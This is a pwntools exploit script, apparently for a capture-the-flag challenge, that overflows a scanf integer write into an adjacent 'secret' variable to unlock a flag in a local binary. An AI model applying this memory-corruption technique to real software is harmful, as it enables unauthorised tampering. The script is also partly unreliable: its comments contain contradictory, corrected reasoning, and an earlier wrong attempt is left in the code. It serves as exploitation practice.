from pwn import *

elf = ELF("./client")
io = elf.process()

# We need to find an integer `V` such that:
# 1. When `V` is truncated to a `short` (2 bytes), it is `1` or `2`.
#    This means V & 0xFFFF should be 1 or 2.
# 2. When `V` is written as a 4-byte integer starting at `&n`,
#    it causes `secret` (at &n + 2) to become `0xBADC0DE`.
#
# Our GDB analysis showed:
# secret is at 0x7fffffffd794 (4 bytes)
# n is at 0x7fffffffd792 (2 bytes)
#
# When scanf("%d", &n) processes V = [B3][B2][B1][B0]:
# B0 goes to n[0]
# B1 goes to n[1]
# B2 goes to secret[0]
# B3 goes to secret[1]
#
# To make secret = 0xBADC0DE (little-endian: 0xDE C0 AD BA):
# secret[0] must be 0xDE  => B2 = 0xDE
# secret[1] must be 0xC0  => B3 = 0xC0
# secret[2] (0xAD) and secret[3] (0xBA) are untouched by this overflow.
# The original secret is 0xBADCAFE (0xFE CA AD 0B).
# So after overwrite, secret should become 0xBA AD CA FE (original high bytes) + 0xC0 DE (new low bytes)
# Oh, my previous analysis on byte order for secret was wrong. Let's re-confirm.
# 0xBADCAFE in little-endian: 0xFE at LSB, 0xCA at next, 0xAD at next, 0x0B at MSB.
# So, secret bytes in memory (from lower to higher address) are: [0xFE] [0xCA] [0xAD] [0x0B]
# Target secret 0xBADC0DE: [0xDE] [0xC0] [0xAD] [0xBA]
#
# So:
# B2 should be 0xDE
# B3 should be 0xC0
#
# This means the integer V needs to be 0xC0DExxxx (where xxxx are the low 2 bytes)
#
# To make n = 1: B0 = 0x01, B1 = 0x00
# So, V = 0xC0DE0001
#
# Convert 0xC0DE0001 to decimal:
# 0xC0DE0001 = (0xC0 * 256^3) + (0xDE * 256^2) + (0x00 * 256^1) + (0x01 * 256^0)
#            = (192 * 16777216) + (222 * 65536) + 0 + 1
#            = 3221225472 + 14510016 + 1
#            = 3235735489

# Let's re-calculate: 0xC0DE0001
# int(0xC0DE0001).to_bytes(4, 'little') would be 0x01 0x00 0xDE 0xC0
#
# So, if we input the decimal value of 0xC0DE0001, then:
# B0 = 0x01
# B1 = 0x00
# B2 = 0xDE
# B3 = 0xC0

# This means:
# n becomes 0x0001 (1 decimal) -> Loop continues!
# secret[0] becomes 0xDE
# secret[1] becomes 0xC0
# secret[2] and secret[3] remain 0xAD and 0x0B respectively.
# So, secret becomes 0x0BADC0DE. YES! This matches the target.

input_n_value = 0xC0DE0001 # Hex value
input_for_n = str(input_n_value).encode() # Convert to decimal string for scanf

log.info(f"Sending input '{input_for_n.decode()}' for n.")

# Send the crafted 'n' value
io.sendlineafter(b'> ', input_for_n)

# Since n becomes 1, the loop will continue.
# Now, send dummy inputs for x and y. Their values don't matter.
io.sendlineafter(b'Enter the first number: ', b'0')
io.sendlineafter(b'Enter the second number: ', b'0')

# The loop will then break because n is 1 (1 != 1 && 1 != 2 is False).
# Ah, wait. if n is 1, it enters the add() function.
# The condition is `if (n != 1 && n != 2) { break; }`.
# If n is 1, the condition is `False && True` which is `False`. So it doesn't break.
# It then goes to `add()`.
# If n is 2, the condition is `True && False` which is `False`. So it doesn't break.
# It then goes to `subtract()`.

# It only breaks if n is *not* 1 AND *not* 2.
# So, if we set n to 1 or 2, the loop *will* continue and perform add/subtract.
# But then it loops back to print_menu. The `secret` check is *after* the `while(1)` loop.

# This means the program will continue looping endlessly, asking for numbers,
# UNLESS we provide a value for `n` that is NEITHER 1 NOR 2, after truncation.

# Let's re-evaluate:
# If n is 0xC0DE0001, then n becomes 1. The loop continues.
# If the goal is to trigger the `secret` check, the loop *must* break.
# This means `n` after truncation needs to be a value other than 1 or 2.

# This implies we cannot set n to 1 or 2.
# So, my previous script (inputting 0xBADC0DE which makes n = -16162) was correct in terms of breaking the loop.
# The issue was that the `secret` value wasn't fully overwritten with 0xBADC0DE by just using 0xBADC0DE as input.

# Let's combine the GDB findings with the need for `n` to break the loop.
# Target: secret = 0xBADC0DE (0xDE C0 AD BA in memory, lower to higher address)
# n is at 0x7fffffffd792. secret is at 0x7fffffffd794.
#
# We need to input `V` (4 bytes, `B3 B2 B1 B0`) to `scanf`.
# B0 -> n[0]
# B1 -> n[1]
# B2 -> secret[0] (should be 0xDE)
# B3 -> secret[1] (should be 0xC0)
#
# So, V must be 0xC0DEB1B0 where B1B0 is such that (B1B0 as short) != 1 AND (B1B0 as short) != 2.
# The simplest would be B1B0 = 0x0000 (0 decimal).
# So, V = 0xC0DE0000.
#
# Check:
# If V = 0xC0DE0000 (decimal 3235735488):
# n gets 0x0000 (0 decimal). This is not 1 or 2, so the loop BREAKS.
# secret gets 0xC0DE for its lower two bytes.
# So, secret becomes 0x0BADC0DE. This is the target!

# The value to input for n is 0xC0DE0000.
input_n_value = 0xC0DE0000
input_for_n = str(input_n_value).encode()

log.info(f"Sending input '{input_for_n.decode()}' for n.")

# Send the crafted 'n' value
io.sendlineafter(b'> ', input_for_n)

# We expect the loop to break because `n` (after truncation) will be 0, which is not 1 or 2.
# So, the program will jump directly to the 'secret' check.
# We should NOT try to send 'x' and 'y' values, as those prompts won't appear.

# Now, wait for the successful output.
# The program prints "Wha... How do you do that!?" if secret is changed.
# Then "Anyway, here's the flag: %s\n"
try:
    log.info("Waiting for success message...")
    io.recvuntil(b'Wha... How do you do that!?', timeout=1)

    log.info("Success message received! Waiting for flag...")
    io.recvuntil(b'Anyway, here\'s the flag: ', timeout=1)

    flag = io.recvline().strip()

    log.success(f'Flag found: {flag}')

except EOFError:
    log.error("EOFError: Program terminated early. Secret was likely not changed or an unexpected exit occurred.")
    log.info("The program did not print 'Wha... How do you do that!?', indicating secret was not 0xBADC0DE.")
    log.info("This means the offset/vulnerability is not what we assumed, or there's another issue.")
except PwnlibException as e:
    log.error(f"PwnlibException: {e}. Something unexpected happened before finding the flag text.")
    log.info("This could be a timeout if the program didn't print the expected text.")
    log.info("Double-check the exact strings the program prints.")

io.close()
